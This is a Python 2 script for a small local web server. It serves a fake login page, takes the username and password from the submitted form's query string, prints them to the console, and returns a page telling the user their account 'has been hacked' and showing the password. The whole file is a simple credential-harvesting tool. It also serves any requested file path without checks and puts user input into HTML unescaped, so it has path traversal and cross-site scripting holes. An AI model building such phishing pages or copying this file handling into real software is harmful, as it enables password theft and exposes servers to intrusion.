from BaseHTTPServer import BaseHTTPRequestHandler
import urlparse
from threading import Thread

global resp
#resp =  open("./Login/index.html", "r+").read()
#resp =  open("./Login/city.jpg", "r+").read()

class GetHandler(BaseHTTPRequestHandler):
	
	def do_GET(self):
		parsed_path = urlparse.urlparse(self.path)
		print self.headers
		print self.command

		message_parts = [
			'CLIENT VALUES:',
			'client_address=%s (%s)' % (self.client_address,
			                            self.address_string()),
			'command=%s' % self.command,
			'path=%s' % self.path,
			'real path=%s' % parsed_path.path,
			'query=%s' % parsed_path.query,
			'request_version=%s' % self.request_version,
			'',
			'SERVER VALUES:',
			'server_version=%s' % self.server_version,
			'sys_version=%s' % self.sys_version,
			'protocol_version=%s' % self.protocol_version,
			'',
			'HEADERS RECEIVED:',
			]
		for name, value in sorted(self.headers.items()):
			message_parts.append('%s=%s' % (name, value.rstrip()))
		message_parts.append('')
		message = '\r\n'.join(message_parts)
		#self.send_response(200)
		self.end_headers()
		#self.wfile.write(message)
		#resp =  open("./Login/index.html", "r+").read()
		#resp =  open("./Login/city.jpg", "r+").read()
		#self.wfile.write(resp)

		if self.path =="/" or self.path == "/Login/index.html":
			Login  = open("./Login/index.html", "r+").read()
			self.wfile.write(Login)

		elif 'city' in self.path:
			img  = open("./Login/city1.jpg", "r").read()
			self.wfile.write(img)

		elif 'myform' in self.path:
			form_str = parsed_path.query
			username = form_str.split("=")[1].split("&")[0]
			password = form_str.split("=")[2]
			print (username,password)
	
			make = """<html>
  <head>
    <meta charset="UTF-8">


    <title>Signin</title>
    
    
       
    
        <script src="js/prefixfree.min.js"></script>

    <link rel="stylesheet" href="Login/css/flow.css">
  </head>

  <body background= "city.jpg">

    <div class="body"></div>
		<div class="grad"></div>
		<div class="header">
			<div>Welcome<span>Login</span></div><br>
			<div>Hi %s , welcome your account has been hacked
			Your password is %s </div>
		</div>
		<br>

	
		
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
  </body>
</html> """	 % (username, password)

			self.wfile.write(make)

			
		else:
			Show  = open("."+self.path, "r+").read()
			self.wfile.write(Show)
		

if __name__ == '__main__':
    from BaseHTTPServer import HTTPServer
    try:
    	Thread(target=GetHandler).start()
    except TypeError:
    	pass
    server = HTTPServer(('localhost', 8080), GetHandler)
    print ('Starting server, use <Ctrl-C> to stop')	
    server.serve_forever()